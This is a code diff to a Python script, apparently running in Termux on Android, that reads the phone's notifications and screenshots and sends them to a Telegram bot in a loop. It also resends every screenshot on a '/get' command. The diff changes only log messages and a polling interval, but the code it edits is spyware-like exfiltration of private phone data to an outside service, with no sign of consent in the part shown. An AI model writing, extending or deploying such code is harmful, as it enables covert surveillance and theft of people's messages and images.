@@ -71,7 +71,7 @@ def handle_get_command():
     if screenshots:
         for screenshot in screenshots:
             send_telegram_photo(screenshot)
-    send_telegram_message("All screenshots sent again.")
+    send_telegram_message("All screenshots have been sent again.")
 
 def capture_notifications():
     """Capture notifications using termux-notification-list."""
@@ -88,7 +88,7 @@ def capture_notifications():
         # Send notifications to Telegram if any exist
         if message.strip() != "Notifications:\n\n":
             send_telegram_message(message)
-            print("Notifications sent to Telegram.")
+            print("Sending notifications to Telegram.")
 
     except subprocess.CalledProcessError as e:
         print(f"Error capturing notifications: {e.output.decode()}")
@@ -97,7 +97,7 @@ def main():
     sent_screenshots = get_sent_screenshots()
     while True:
         if is_online():
-            print("Device is online.")
+            print("Device is online. Starting process...")
 
             # Capture notifications every 5 minutes
             capture_notifications()
@@ -111,7 +111,7 @@ def main():
                     send_telegram_photo(screenshot)
                     sent_screenshots.add(screenshot)
                     update_sent_screenshots(screenshot)
-                    print(f"Sent screenshot: {screenshot}")
+                    print(f"Sending to Telegram: {screenshot}")
 
             # Listen for /get command (placeholder for actual implementation)
             # Replace this section with an actual Telegram bot handler.
@@ -119,8 +119,8 @@ def main():
             if command == "/get":
                 handle_get_command()
         else:
-            print("Device is offline. Pausing...")
-            time.sleep(10)  # Check again after 10 seconds
+            print("Device is offline. Pausing and checking every 5 minutes...")
+            time.sleep(300)  # Check every 5 minutes
 
 if __name__ == "__main__":
     main()
